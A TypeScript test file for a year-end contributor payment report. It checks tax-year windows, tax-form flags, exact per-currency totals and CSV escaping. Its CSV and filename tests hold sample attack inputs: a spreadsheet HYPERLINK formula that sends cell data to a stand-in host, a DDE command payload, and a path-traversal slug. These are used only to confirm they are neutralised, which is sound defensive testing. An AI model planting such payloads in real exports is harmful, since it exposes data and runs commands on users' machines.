/**
 * Year-end payment reporting — the rules, proved without a database.
 *
 * What is proved HERE is the arithmetic and the classification: which year a
 * payment lands in, who gets flagged, what the CSV looks like. What is proved
 * in `e2e.ts` against real Postgres is the part these tests structurally
 * cannot reach — that only `paid` payouts are selected, that the reserve is
 * excluded, and that the window filter is applied by the database rather than
 * by a hopeful comment. That split matters: the query is where a wrong figure
 * would actually come from.
 */

import test from "node:test";
import assert from "node:assert/strict";

import {
  REPORTING_THRESHOLD_MINOR,
  assembleReport,
  csvField,
  csvFilename,
  flagsFor,
  taxYearWindow,
  toCsv,
  type TaxYearRowInput,
} from "../tax/report-1099";

function row(overrides: Partial<TaxYearRowInput> = {}): TaxYearRowInput {
  return {
    contributorId: "c1",
    name: "Alice Example",
    email: "alice@example.com",
    stripeAccountId: "acct_123",
    taxFormType: "W-9",
    taxIdentityStatus: "collected",
    currency: "USD",
    paidMinor: 120000n,
    payoutCount: 3,
    firstPaidAt: new Date("2026-02-01T00:00:00Z"),
    lastPaidAt: new Date("2026-11-01T00:00:00Z"),
    ...overrides,
  };
}

// ---- The window ----

test("the tax year window is half-open and in UTC", () => {
  const { from, until } = taxYearWindow(2026);
  assert.equal(from.toISOString(), "2026-01-01T00:00:00.000Z");
  assert.equal(until.toISOString(), "2027-01-01T00:00:00.000Z");
});

test("consecutive years abut exactly, so no payment falls in two years or neither", () => {
  assert.equal(
    taxYearWindow(2026).until.getTime(),
    taxYearWindow(2027).from.getTime()
  );
});

test("a nonsense year is refused rather than producing an empty report", () => {
  // An empty report and a wrong year look identical on screen. Failing loudly
  // is the only way the difference is visible.
  assert.throws(() => taxYearWindow(1900), RangeError);
  assert.throws(() => taxYearWindow(2026.5), RangeError);
  assert.throws(() => taxYearWindow(Number.NaN), RangeError);
});

// ---- Flags ----

test("a US person with a collected W-9 over the threshold has nothing flagged", () => {
  assert.deepEqual(flagsFor(row()), []);
});

test("being paid with no tax form on file is flagged, never dropped", () => {
  const flags = flagsFor(row({ taxFormType: null, taxIdentityStatus: "not_collected" }));
  assert.ok(flags.includes("no_tax_form"));
});

test("a pending tax identity still counts as no form — pending is not collected", () => {
  assert.ok(flagsFor(row({ taxFormType: null, taxIdentityStatus: "pending" })).includes("no_tax_form"));
});

test("a rejected identity is distinguished from one never collected", () => {
  // Different actions: one is "ask them to sign up", the other is "the details
  // they gave are wrong". Collapsing them sends the wrong chase email.
  const flags = flagsFor(row({ taxFormType: "W-9", taxIdentityStatus: "invalid" }));
  assert.ok(flags.includes("invalid_tax_identity"));
  assert.ok(!flags.includes("no_tax_form"));
});

test("a W-8BEN marks a foreign person rather than a missing W-9", () => {
  const flags = flagsFor(row({ taxFormType: "W-8BEN", taxIdentityStatus: "collected" }));
  assert.deepEqual(flags, ["foreign_person"]);
});

test("a foreign person with an uncollected identity is still reported as foreign", () => {
  const flags = flagsFor(row({ taxFormType: "w-8ben", taxIdentityStatus: "not_collected" }));
  assert.ok(flags.includes("foreign_person"));
  assert.ok(!flags.includes("no_tax_form"));
});

test("exactly $600 meets the threshold; a cent under does not", () => {
  assert.equal(REPORTING_THRESHOLD_MINOR, 60000n);
  assert.ok(!flagsFor(row({ paidMinor: 60000n })).includes("below_threshold"));
  assert.ok(flagsFor(row({ paidMinor: 59999n })).includes("below_threshold"));
});

test("a non-USD row is flagged and never carries a dollar threshold judgement", () => {
  const flags = flagsFor(row({ currency: "GBP", paidMinor: 100n }));
  assert.ok(flags.includes("non_usd"));
  assert.ok(!flags.includes("below_threshold"));
});

// ---- Assembly ----

test("under-threshold people are included, not filtered out", () => {
  // State thresholds are lower than the federal one and the federal one moves.
  // A row an accountant ignores costs nothing; a row never shown cannot be
  // recovered.
  const report = assembleReport(2026, [
    row({ contributorId: "big", paidMinor: 500000n }),
    row({ contributorId: "small", name: "Bob", paidMinor: 1000n }),
  ]);

  assert.equal(report.rows.length, 2);
  assert.equal(report.reportableRowCount, 1);
  assert.ok(report.rows.some((r) => r.contributorId === "small"));
});

test("totals are kept per currency and never summed across them", () => {
  const report = assembleReport(2026, [
    row({ contributorId: "a", currency: "USD", paidMinor: 100000n }),
    row({ contributorId: "b", name: "Bob", currency: "GBP", paidMinor: 250000n }),
  ]);

  assert.equal(report.totalsByCurrency.length, 2);
  const usd = report.totalsByCurrency.find((t) => t.currency === "USD")!;
  const gbp = report.totalsByCurrency.find((t) => t.currency === "GBP")!;
  assert.equal(usd.totalMinor, 100000n);
  assert.equal(gbp.totalMinor, 250000n);
});

test("one person paid in two currencies is two rows, not one merged total", () => {
  const report = assembleReport(2026, [
    row({ contributorId: "c1", currency: "USD", paidMinor: 100000n }),
    row({ contributorId: "c1", currency: "GBP", paidMinor: 100000n }),
  ]);

  assert.equal(report.rows.length, 2);
  assert.equal(report.totalsByCurrency.length, 2);
});

test("…but that is ONE person, and the people count says so", () => {
  // Found by loading the screen: the row count was being labelled "people",
  // so a business paying one artist in two currencies was told it had paid
  // two. The total beside it was right, which is worse — the wrong number is
  // the one that gets checked against their own records first.
  const report = assembleReport(2026, [
    row({ contributorId: "c1", currency: "USD", paidMinor: 100000n }),
    row({ contributorId: "c1", currency: "GBP", paidMinor: 100000n }),
    row({ contributorId: "c2", name: "Bob", currency: "USD", paidMinor: 100000n }),
  ]);

  assert.equal(report.rows.length, 3);
  assert.equal(report.contributorCount, 2);
});

test("the missing-paperwork count is what the owner can act on", () => {
  const report = assembleReport(2026, [
    row({ contributorId: "a", taxFormType: null, taxIdentityStatus: "not_collected" }),
    row({ contributorId: "b", name: "Bob", taxFormType: "W-9", taxIdentityStatus: "invalid" }),
    row({ contributorId: "c", name: "Carla", taxFormType: "W-8BEN" }),
    row({ contributorId: "d", name: "Dan" }),
  ]);

  // Foreign persons are NOT counted as missing paperwork — they have their
  // paperwork, it is just a different form.
  assert.equal(report.missingTaxFormCount, 2);
});

test("totals are exact at magnitudes a float would round", () => {
  // The reason every amount is a bigint. `Number` loses this figure.
  const huge = 9007199254740993n;
  const report = assembleReport(2026, [
    row({ contributorId: "a", paidMinor: huge }),
    row({ contributorId: "b", name: "Bob", paidMinor: 1n }),
  ]);

  assert.equal(report.totalsByCurrency[0].totalMinor, huge + 1n);

  // And the reason the rule exists, pinned so it survives future readers: this
  // exact value does not round-trip through a float. Anyone tempted to sum
  // these with `+` on numbers is off by a cent at $90 trillion — which is
  // absurd for one artist and entirely ordinary for a lifetime platform total.
  assert.notEqual(BigInt(Number(huge)), huge);
  assert.equal(Number(huge), 9007199254740992);
});

test("rows are ordered largest first within a currency", () => {
  const report = assembleReport(2026, [
    row({ contributorId: "small", name: "Bob", paidMinor: 1000n }),
    row({ contributorId: "big", name: "Alice", paidMinor: 900000n }),
  ]);

  assert.equal(report.rows[0].contributorId, "big");
});

test("an empty year assembles rather than throwing", () => {
  const report = assembleReport(2026, []);
  assert.equal(report.rows.length, 0);
  assert.equal(report.totalsByCurrency.length, 0);
  assert.equal(report.reportableRowCount, 0);
});

// ---- CSV ----

test("ordinary fields pass through unquoted", () => {
  assert.equal(csvField("Alice Example"), "Alice Example");
});

test("commas, quotes and newlines are quoted and escaped", () => {
  assert.equal(csvField("Doe, Jane"), '"Doe, Jane"');
  assert.equal(csvField('She said "hi"'), '"She said ""hi"""');
  assert.equal(csvField("line1\nline2"), '"line1\nline2"');
});

test("⚠️ a leading = is neutralised — a spreadsheet would treat it as a formula", () => {
  // The realistic attack: a contributor name is set to a formula, the export is
  // opened by an accountant, and the cell runs. Prefixing with an apostrophe
  // forces text in every spreadsheet that implements the behaviour.
  const injected = csvField('=HYPERLINK("http://evil.example/"&A1,"click")');
  assert.ok(injected.startsWith(`"'=`));
});

test("all four formula-leading characters are neutralised, not just =", () => {
  for (const char of ["=", "+", "-", "@"]) {
    const out = csvField(`${char}cmd|'/c calc'!A0`);
    assert.ok(out.startsWith(`"'${char}`), `${char} was not neutralised`);
  }
});

test("a tab or carriage return leading a field is also neutralised", () => {
  // Excel strips leading whitespace before deciding, so "\t=1+1" is a formula.
  assert.ok(csvField("\t=1+1").startsWith(`"'`));
  assert.ok(csvField("\r=1+1").startsWith(`"'`));
});

test("the CSV has the expected header and one row per person", () => {
  const csv = toCsv(
    assembleReport(2026, [
      row({ contributorId: "a", name: "Alice", paidMinor: 123456n }),
      row({ contributorId: "b", name: "Bob", paidMinor: 5000n, taxFormType: null, taxIdentityStatus: "not_collected" }),
    ])
  );

  const lines = csv.trimEnd().split("\r\n");
  assert.equal(lines.length, 3);
  assert.ok(lines[0].startsWith("contributor_id,name,email"));
  assert.ok(lines[1].includes("1234.56"));
  assert.ok(lines[1].includes("yes"));
  assert.ok(lines[2].includes("50.00"));
  assert.ok(lines[2].includes("no"));
  assert.ok(lines[2].includes("no_tax_form"));
});

test("CSV amounts are plain decimals with no symbol or grouping", () => {
  // A spreadsheet has to parse these as numbers. `$64,400.00` arrives as text
  // and every SUM downstream silently returns zero.
  const csv = toCsv(assembleReport(2026, [row({ paidMinor: 6440000n })]));
  assert.ok(csv.includes(",64400.00,"));
  assert.ok(!csv.includes("$"));
  assert.ok(!csv.includes("64,400"));
});

test("CSV dates are UTC calendar days, matching every other date shown", () => {
  const csv = toCsv(
    assembleReport(2026, [
      row({
        firstPaidAt: new Date("2026-03-04T23:30:00Z"),
        lastPaidAt: new Date("2026-12-31T23:30:00Z"),
      }),
    ])
  );
  assert.ok(csv.includes("2026-03-04"));
  assert.ok(csv.includes("2026-12-31"));
});

test("lines end CRLF, as RFC 4180 and Excel expect", () => {
  const csv = toCsv(assembleReport(2026, [row()]));
  assert.ok(csv.endsWith("\r\n"));
  assert.ok(!csv.includes("\n\n"));
});

test("the filename names the business and the year", () => {
  assert.equal(csvFilename("369", 2026), "369-payments-2026.csv");
});

test("a slug that would escape the filename is stripped", () => {
  // The slug reaches a Content-Disposition header. A quote or a slash there is
  // a header-injection and a path-traversal question at the same time.
  assert.equal(csvFilename('../../etc/pa"sswd', 2026), "etcpasswd-payments-2026.csv");
  assert.equal(csvFilename("!!!", 2026), "tenant-payments-2026.csv");
});
